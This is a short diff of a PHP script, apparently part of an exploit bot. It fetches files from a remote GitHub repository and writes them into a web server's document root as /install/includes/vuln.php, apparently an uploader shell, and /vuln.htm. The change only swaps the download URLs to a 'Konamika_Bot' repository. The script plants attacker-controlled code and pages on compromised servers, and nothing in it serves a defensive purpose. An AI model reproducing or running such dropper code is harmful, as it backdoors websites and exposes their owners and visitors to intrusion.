@@ -10,7 +10,7 @@ function http_get($url){
 	curl_close($im);
 }
 $check = $_SERVER['DOCUMENT_ROOT'] . "/install/includes/vuln.php" ;
-$text = http_get('https://raw.githubusercontent.com/konamika/BackToFuck/master/up.php');
+$text = http_get('https://raw.githubusercontent.com/Harroum/Konamika_Bot_v1.2/master/up.php');
 $open = fopen($check, 'w');
 fwrite($open, $text);
 fclose($open);
@@ -21,7 +21,7 @@ if(file_exists($check)){
 echo "done .\n " ;
 
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
-$text2 = http_get('https://raw.githubusercontent.com/konamika/BackToFuck/master/vuln.txt');
+$text2 = http_get('https://raw.githubusercontent.com/Harroum/Konamika_Bot_v1.2/master/vuln.txt');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
